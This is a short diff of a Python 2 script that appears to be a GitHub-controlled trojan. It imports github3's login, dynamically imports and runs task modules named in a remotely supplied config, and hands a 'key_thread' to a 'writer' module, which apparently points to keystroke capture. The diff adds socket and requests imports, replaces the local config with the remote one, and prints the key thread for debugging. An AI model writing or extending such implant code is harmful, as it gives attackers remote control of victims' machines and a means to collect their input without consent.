@@ -5,11 +5,13 @@ import time
 import imp
 import platform
 import random
+import socket
 import threading
 import Queue
 import os
 import uuid
 
+from requests import get
 from github3 import login
 
 try:
@@ -70,11 +72,11 @@ def get_process_config():
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
 
-        config.update(aux_config)
+        #config = config + aux_config
+        config = aux_config
     else:
         print "[*] Unknown platform %s" % platform.system()
 
-    
     return config
 
 
@@ -90,7 +92,9 @@ def store_module_result(data, module):
 
 
 def module_runner(module):
+    global key_thread
     task_queue.put(1)
+    print("KEY THREAD : %s" % str(key_thread))
     if module == 'writer':
         result = sys.modules[module].run(thread=key_thread)
     else:
